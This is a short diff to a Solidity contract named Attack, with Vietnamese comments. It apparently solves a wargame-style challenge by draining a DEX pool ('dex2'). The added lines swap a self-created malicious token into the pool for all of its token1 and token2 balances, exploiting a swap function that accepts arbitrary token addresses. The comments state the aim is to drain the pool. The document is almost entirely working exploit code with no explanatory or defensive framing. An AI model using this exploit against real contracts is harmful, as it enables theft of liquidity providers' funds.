@@ -25,7 +25,11 @@ contract Attack {
         // Tổng số token chính xác sẽ được dùng
         IERC20 maliciousToken = IERC20(new MaliciousToken(4));
         maliciousToken.transfer(address(dex2), 1);
-        IERC20(dex2.token1()).balanceOf(address(dex2));
-        IERC20(dex2.token2()).balanceOf(address(dex2));
+        uint256 balance1 = IERC20(dex2.token1()).balanceOf(address(dex2));
+        uint256 balance2 = IERC20(dex2.token2()).balanceOf(address(dex2));
+        // Hiện tại đã có 1 token malicious trong pool nên chúng ta chỉ cần 1 token nữa để drain
+        dex2.swap(address(maliciousToken), dex2.token1(), 1 * balance1);
+        // Hiện tại đã có 2 token malicious nên chúng ta cần 2 token để drain
+        dex2.swap(address(maliciousToken), dex2.token2(), 2 * balance2);
     }
 }
